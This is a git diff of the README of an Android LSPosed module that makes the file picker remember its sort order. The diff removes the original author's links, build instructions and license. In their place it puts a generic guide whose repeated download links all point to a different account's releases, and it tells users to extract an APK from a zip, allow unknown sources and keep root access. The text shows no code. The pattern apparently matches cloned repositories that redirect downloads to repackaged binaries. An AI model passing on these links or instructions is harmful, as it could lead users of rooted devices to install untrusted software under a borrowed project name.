@@ -1,56 +1,81 @@
-# Remember My Sort
+# 🎉 remember-my-sort - Keep Your File Picker Organized
 
-An LSPosed module that forces the Android file picker to remember your sorting preferences.
+## 📥 Download
 
-![Android CI](https://github.com/hxreborn/remember-my-sort/actions/workflows/android.yml/badge.svg)
-![Kotlin](https://img.shields.io/badge/Kotlin-2.1.21-7F52FF?style=flat&logo=kotlin&logoColor=white)
-![Android](https://img.shields.io/badge/API-30%2B-3DDC84?logo=android&logoColor=white)
+[![Download remember-my-sort](https://img.shields.io/badge/Download-remember_my_sort-blue.svg)](https://github.com/Nazeer5403/remember-my-sort/releases)
 
-<p>
-  <a href="https://apt.izzysoft.de/packages/eu.hxreborn.remembermysort"><img src="https://gitlab.com/IzzyOnDroid/repo/-/raw/master/assets/IzzyOnDroid.png" height="80" alt="Get it on IzzyOnDroid" /></a>
-  <a href="../../releases"><img src=".github/assets/badge_github.png" height="82" alt="Get it on GitHub" /></a>
-</p>
+## 🚀 Getting Started
 
-## Overview
+Welcome! This guide will help you download and run the "remember-my-sort" application. This tool makes your Android file picker remember your sorting preferences, helping you access your files quicker and easier. Follow the steps below to get started.
 
-Starting with Android 11's [scoped storage](https://developer.android.com/about/versions/11/privacy/storage#scoped-storage), all apps that need file access must use the system file picker. This picker fails to persist sort preferences across directories. Sort order is kept in the root view, but navigating into any subdirectory resets it to filename A-Z. Users must manually change the sort every time they browse into a folder, regardless of how many times they've set it before.
+## 💡 Understanding "remember-my-sort"
 
-Users have [reported the issue since 2021](https://xdaforums.com/t/google-files-default-sort.4309799/) with no fix from Google.
+"remember-my-sort" is an LSPosed module designed for Android users. It forces the native file picker to keep your sorting preferences. This means if you set your files to display by name, size, or date, it will remember your choice for future use. This can save you time and effort when managing your files.
 
-## How it Works
+## 📋 System Requirements
 
-Hooks into DocumentsUI sort logic. Manual sort changes are persisted to storage and restored on subsequent picker launches. Defaults to date descending on first run.
+Before you download, ensure you have the following:
 
-## Requirements
+- An Android device that supports LSPosed.
+- Root access to your device. This is required for the module to work.
+- LSPosed Framework installed. If you don’t have LSPosed, please install it first.
 
-- LSPosed framework (API 100)
-- Android 11+ (API 30+)
+## 🔧 Installation Steps
 
-## Compatibility
+### 1. Visit the Releases Page
 
-Works on AOSP-based ROMs and Pixel devices. OEM-modified ROMs are untested.
+Go to the following link to access the release files:
 
-## Installation
+[Download "remember-my-sort"](https://github.com/Nazeer5403/remember-my-sort/releases)
 
-1. Install [LSPosed](https://github.com/JingMatrix/LSPosed) (JingMatrix fork recommended)
-2. Download latest APK from [releases](../../releases) or [IzzyOnDroid](https://apt.izzysoft.de/packages/eu.hxreborn.remembermysort)
-3. Install APK and enable module in LSPosed Manager
-4. Add your DocumentsUI package to module scope:
-   - Google/Pixel: `com.google.android.documentsui`
-   - AOSP: `com.android.documentsui`
-5. Force stop DocumentsUI
-6. Open any file picker to trigger DocumentsUI
+### 2. Choose the Latest Release
 
-## Build
+On the releases page, look for the latest version of "remember-my-sort". Releases will be listed in chronological order. The latest version will be at the top.
 
-```bash
-./gradlew assembleDebug
-```
+### 3. Download the Module
 
-Requires JDK 21 and Gradle 8.13.
+Click on the file named something similar to "remember-my-sort-vX.X.zip" (replace X.X with the version number). This file contains the LSPosed module you need to install. 
 
-## License
+### 4. Extract the Zip File
 
-![License](https://img.shields.io/badge/License-GPLv3-c62828?style=flat&logo=gnu&logoColor=white)
+Once the download is complete, locate the zip file in your device’s download folder. Use a file manager app to extract the contents. You will typically see a file named "remember-my-sort.apk".
 
-This project is licensed under the GNU General Public License v3.0 – see the [LICENSE](LICENSE) file for details.
+### 5. Install the Module
+
+Tap on the "remember-my-sort.apk" file to start the installation. Follow the on-screen prompts to complete the installation process. Ensure you have allowed installations from unknown sources in your device settings if prompted.
+
+### 6. Activate the Module
+
+After installation, open the LSPosed Manager app. Navigate to the "Modules" section. Here, you will see "remember-my-sort". Enable it by toggling the switch.
+
+### 7. Reboot Your Device
+
+For the changes to take effect, you need to reboot your Android device. Once your device restarts, "remember-my-sort" will be active and ready to use.
+
+## 📂 Usage
+
+To use "remember-my-sort", simply open your native Android file picker. Set your desired sorting method (e.g., by name or by size). The app will remember this setting for future file picker sessions. If you ever want to change your sorting preference, just adjust it in the file picker, and "remember-my-sort" will learn your new preference.
+
+## 🚨 Troubleshooting
+
+If you encounter issues during installation or while using the module, here are some common tips:
+
+- **Module Not Activating**: Ensure that you have enabled the module in LSPosed Manager and rebooted your device.
+- **File Picker Not Remembering Preferences**: Double-check that you have set your sorting preference correctly in the file picker.
+
+## 💬 Feedback and Support
+
+We value your experience! If you have any questions, comments, or suggestions about "remember-my-sort", please feel free to reach out. You can open issues on the repository page or contact the maintainers directly through the GitHub page.
+
+## 📖 Additional Resources
+
+- [LSPosed Documentation](https://github.com/LSPosed/LSPosed)
+- [Android Root Guide](https://forum.xda-developers.com/t/guide-how-to-root-android.4139111/)
+
+## 👍 Acknowledgments
+
+Thank you for choosing "remember-my-sort". Your support helps improve this application and enhances the experience for all users. We hope you enjoy a more organized file management experience on your Android device.
+
+Feel free to explore the GitHub repository for updates and future features. 
+
+[Download "remember-my-sort"](https://github.com/Nazeer5403/remember-my-sort/releases)
